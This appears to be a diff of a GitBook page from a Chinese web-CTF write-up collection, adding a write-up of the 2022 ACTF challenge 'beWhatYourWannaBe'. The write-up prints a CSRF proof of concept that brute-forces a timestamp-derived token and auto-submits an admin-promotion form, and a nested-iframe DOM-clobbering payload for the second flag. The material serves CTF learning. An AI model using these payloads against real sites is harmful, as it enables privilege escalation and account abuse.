@@ -115,7 +115,7 @@
     <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="myclient.html" />
+    <link rel="next" href="poorui.html" />
     
     
     <link rel="prev" href="gogogo.html" />
@@ -194,22 +194,6 @@
                     
                         <b>1.2.</b>
                     
-                    按照比赛分类
-            
-                </a>
-            
-
-            
-            <ul class="articles">
-                
-    
-        <li class="chapter " data-level="1.2.1" data-path="./">
-            
-                <a href="./">
-            
-                    
-                        <b>1.2.1.</b>
-                    
                     2022 XCTF_ACTF
             
                 </a>
@@ -219,12 +203,12 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="1.2.1.1" data-path="gogogo.html">
+        <li class="chapter " data-level="1.2.1" data-path="gogogo.html">
             
                 <a href="gogogo.html">
             
                     
-                        <b>1.2.1.1.</b>
+                        <b>1.2.1.</b>
                     
                     gogogo
             
@@ -234,12 +218,12 @@
             
         </li>
     
-        <li class="chapter active" data-level="1.2.1.2" data-path="beWhatYourWannaBe.html">
+        <li class="chapter active" data-level="1.2.2" data-path="beWhatYourWannaBe.html">
             
                 <a href="beWhatYourWannaBe.html">
             
                     
-                        <b>1.2.1.2.</b>
+                        <b>1.2.2.</b>
                     
                     beWhatYourWannaBe
             
@@ -249,42 +233,12 @@
             
         </li>
     
-        <li class="chapter " data-level="1.2.1.3" data-path="myclient.html">
-            
-                <a href="myclient.html">
-            
-                    
-                        <b>1.2.1.3.</b>
-                    
-                    myclient
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="1.2.1.4" data-path="ToLeSion.html">
-            
-                <a href="ToLeSion.html">
-            
-                    
-                        <b>1.2.1.4.</b>
-                    
-                    ToLeSion
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="1.2.1.5" data-path="poorui.html">
+        <li class="chapter " data-level="1.2.3" data-path="poorui.html">
             
                 <a href="poorui.html">
             
                     
-                        <b>1.2.1.5.</b>
+                        <b>1.2.3.</b>
                     
                     poorui
             
@@ -296,41 +250,6 @@
     
 
             </ul>
-            
-        </li>
-    
-        <li class="chapter " data-level="1.2.2" data-path="../TetCTF/">
-            
-                <a href="../TetCTF/">
-            
-                    
-                        <b>1.2.2.</b>
-                    
-                    2022 TetCTF
-            
-                </a>
-            
-
-            
-        </li>
-    
-
-            </ul>
-            
-        </li>
-    
-        <li class="chapter " data-level="1.3" data-path="../">
-            
-                <a href="../">
-            
-                    
-                        <b>1.3.</b>
-                    
-                    按照考点分类
-            
-                </a>
-            
-
             
         </li>
     
@@ -379,7 +298,72 @@
     
                                 <section class="normal markdown-section">
                                 
-                                
+                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><ul><li><span class="title-icon "></span><a href="#&#x9898;&#x76EE;&#x4ECB;&#x7ECD;"><b></b>&#x9898;&#x76EE;&#x4ECB;&#x7ECD;</a></li><li><span class="title-icon "></span><a href="#writeup"><b></b>Writeup</a></li></ul></ul></div><a href="#" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h2 id="&#x9898;&#x76EE;&#x4ECB;&#x7ECD;"><a name="&#x9898;&#x76EE;&#x4ECB;&#x7ECD;" class="anchor-navigation-ex-anchor" href="#&#x9898;&#x76EE;&#x4ECB;&#x7ECD;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x9898;&#x76EE;&#x4ECB;&#x7ECD;" class="plugin-anchor" href="#&#x9898;&#x76EE;&#x4ECB;&#x7ECD;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x9898;&#x76EE;&#x4ECB;&#x7ECD;</h2>
+<p><a href="../../../CTF_ATTACHMENTS/2022/ACTF-beWhatYourWannaBe.zip">&#x9644;&#x4EF6;</a></p>
+<pre><code>&#x201C;doctor, actor, lawyer or a singer
+why not president, be a dreamer
+You can be just the one you wanna be.&#x201D;
+
+http://124.71.180.254:10022
+It is recommended to test locally first.
+Chrome&#x2019;s processes will be cleaned up every 2 minutes to avoid take up too much memory.
+Attachment is updated[2022-06-26 2:10 UTC+8] for stable exploitation.
+</code></pre><p>&#x8003;&#x70B9;&#xFF1A;</p>
+<ul>
+<li>CSRF</li>
+</ul>
+<h2 id="writeup"><a name="writeup" class="anchor-navigation-ex-anchor" href="#writeup"><i class="fa fa-link" aria-hidden="true"></i></a><a name="writeup" class="plugin-anchor" href="#writeup"><i class="fa fa-link" aria-hidden="true"></i></a>Writeup</h2>
+<p>&#x56E0;&#x4E3A;&#x540E;&#x7AEF;&#x6709;CSRFtoen&#x7684;&#x9A8C;&#x8BC1;&#xFF0C;&#x5E76;&#x4E14;&#x662F;&#x7528;&#x65F6;&#x95F4;&#x6233;&#x7B97;token&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x5148;CSRF&#x7206;&#x7834;&#x8BA9;&#x6CE8;&#x518C;&#x7684;&#x7528;&#x6237;&#x6709;&#x80FD;&#x8BBF;&#x95EE;&#x7B2C;&#x4E00;&#x6BB5;flag</p>
+<pre><code>&lt;html&gt;
+  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
+  &lt;body&gt;
+    &lt;form name=form1 action=&quot;http://localhost:8000/beAdmin&quot; method=&quot;POST&quot; target=&quot;_blank&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;rdd&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;111&quot; /&gt;
+      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;
+    &lt;/form&gt;
+
+    &lt;script&gt;
+function hash(string) {
+    const utf8 = new TextEncoder().encode(string);
+    return crypto.subtle.digest(&apos;SHA-256&apos;, utf8).then((hashBuffer) =&gt; {
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        const hashHex = hashArray.map((bytes) =&gt; bytes.toString(16).padStart(2, &apos;0&apos;)).join(&apos;&apos;);
+        return hashHex;
+    });
+}
+var data = Date.now()
+for (var i = 0; i &lt; 100; i++) {
+    var tmp = Math.sin(Math.floor((data + 1) / 1000)).toString()
+    hash(tmp).then((hex) =&gt; {
+        console.log(hex, (data + i))
+        document.form1.csrftoken.value = hex
+        document.form1.submit()
+
+    });
+
+}
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>flag2&#xFF0C;&#x9700;&#x8981;&#x6EE1;&#x8DB3;<code>fff.lll.aaa.ggg.value === &quot;this_is_what_i_want&quot;</code></p>
+<p>&#x5B9E;&#x73B0;&#x65B9;&#x6CD5;&#x6709;&#x5F88;&#x591A;&#x79CD;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x6700;&#x540E;&#x6709; <code>&lt;input name=&quot;ggg&quot; type=&quot;submit&quot; value=&quot;this_is_what_i_want&quot;/&gt;</code>&#x5C31;&#x884C;&#x4E86;</p>
+<p>poc.html</p>
+<pre><code>&lt;html&gt;
+&lt;iframe name=fff src=&quot;fff.html&quot;&gt;
+&lt;/html&gt;
+fff.html
+&lt;html&gt;
+&lt;iframe name=lll src=&quot;lll.html&quot;&gt;
+&lt;/html&gt;
+lll.html
+&lt;html&gt;
+     &lt;form id=aaa&gt;
+        &lt;input name=&quot;ggg&quot; type=&quot;submit&quot; value=&quot;this_is_what_i_want&quot;/&gt;
+    &lt;/form&gt;
+&lt;/html&gt;
+</code></pre><p><img src="../../../IMAGES/2022-07-02-22-37-23.png" alt="2022-07-02-22-37-23.png"></p>
+
 <script>console.log("plugin-popup....");document.onclick = function(e){ e.target.tagName === "IMG" && window.open(e.target.src,e.target.src)}</script><style>img{cursor:pointer}</style>
                                 
                                 </section>
@@ -412,7 +396,7 @@
                 </a>
                 
                 
-                <a href="myclient.html" class="navigation navigation-next " aria-label="Next page: myclient">
+                <a href="poorui.html" class="navigation navigation-next " aria-label="Next page: poorui">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -423,7 +407,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"beWhatYourWannaBe","level":"1.2.1.2","depth":3,"next":{"title":"myclient","level":"1.2.1.3","depth":3,"path":"CTF_EVENTS/2022/XCTF_ACTF/myclient.md","ref":"CTF_EVENTS/2022/XCTF_ACTF/myclient.md","articles":[]},"previous":{"title":"gogogo","level":"1.2.1.1","depth":3,"path":"CTF_EVENTS/2022/XCTF_ACTF/gogogo.md","ref":"CTF_EVENTS/2022/XCTF_ACTF/gogogo.md","articles":[]},"dir":"neutral"},"config":{"plugins":["-lunr","-search","search-pro","-sharing","splitter","expandable-chapters-small","toggle-chapters","anchors","github","popup","github-buttons","anchor-navigation-ex","favicon","back-to-top-button","pageview-count","code","advanced-emoji","emphasize","alerts","auto-scroll-table","hide-element","chapter-fold","expandable-chapters","theme-default","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/y1nglamore/gitbook_webctf_summary"},"livereload":{},"splitter":{},"search-pro":{},"auto-scroll-table":{},"popup":{},"code":{"copyButtons":true},"hide-element":{"elements":[".gitbook-link"]},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"favicon":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"github-buttons":{"buttons":[{"user":"y1nglamore","repo":"gitbook_webctf_summary","type":"star","size":"small","count":true}]},"expandable-chapters-small":{},"advanced-emoji":{"embedEmojis":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":true},"anchors":{},"toggle-chapters":{},"expandable-chapters":{}},"theme":"default","author":"Y1ng","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"WEBCTF题目汇总","language":"zh-hans","links":{"sidebar":{"Team r3kapig":"https://r3kapig.com/"}},"gitbook":"3.2.3","description":"记录参加过的比赛中的WEB题目"},"file":{"path":"CTF_EVENTS/2022/XCTF_ACTF/beWhatYourWannaBe.md","mtime":"2022-06-28T14:59:20.751Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-06-30T15:23:43.647Z"},"basePath":"../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"beWhatYourWannaBe","level":"1.2.2","depth":2,"next":{"title":"poorui","level":"1.2.3","depth":2,"path":"CTF_EVENTS/2022/XCTF_ACTF/poorui.md","ref":"CTF_EVENTS/2022/XCTF_ACTF/poorui.md","articles":[]},"previous":{"title":"gogogo","level":"1.2.1","depth":2,"path":"CTF_EVENTS/2022/XCTF_ACTF/gogogo.md","ref":"CTF_EVENTS/2022/XCTF_ACTF/gogogo.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-pro","-sharing","splitter","expandable-chapters-small","toggle-chapters","anchors","github","popup","github-buttons","anchor-navigation-ex","favicon","back-to-top-button","pageview-count","code","advanced-emoji","emphasize","alerts","auto-scroll-table","hide-element","chapter-fold","expandable-chapters","theme-default","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/y1nglamore/gitbook_webctf_summary"},"livereload":{},"splitter":{},"search-pro":{},"auto-scroll-table":{},"popup":{},"code":{"copyButtons":true},"hide-element":{"elements":[".gitbook-link"]},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"favicon":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"github-buttons":{"buttons":[{"user":"y1nglamore","repo":"gitbook_webctf_summary","type":"star","size":"small","count":true}]},"expandable-chapters-small":{},"advanced-emoji":{"embedEmojis":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":true},"anchors":{},"toggle-chapters":{},"expandable-chapters":{}},"theme":"default","author":"Y1ng","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"WEBCTF题目汇总","language":"zh-hans","links":{"sidebar":{"Team r3kapig":"https://r3kapig.com/"}},"gitbook":"3.2.3","description":"记录参加过的比赛中的WEB题目"},"file":{"path":"CTF_EVENTS/2022/XCTF_ACTF/beWhatYourWannaBe.md","mtime":"2022-07-02T14:37:46.647Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-07-04T16:27:15.855Z"},"basePath":"../../..","book":{"language":""}});
         });
     </script>
 </div>
